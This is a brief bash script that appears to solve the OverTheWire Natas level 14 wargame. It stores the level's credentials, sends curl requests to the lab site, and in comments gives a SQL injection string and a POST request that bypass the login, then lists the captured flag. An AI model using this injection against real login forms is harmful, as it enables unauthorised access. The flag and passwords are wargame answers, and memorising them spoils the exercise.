#!/bin/bash

 Username="natas14"
 Password="z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ"

# URL:
 curl -s -u $Username:$Password http://natas14.natas.labs.overthewire.org

# Code
# injection: '1" or "a"="a"#'

# query="username=1\"%20or%20\"a\"=\"a\"#&password=NotNecessary"
# curl -s -d "$query" -u $Username:$Password http://natas14.natas.labs.overthewire.org

# Flag:
# SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
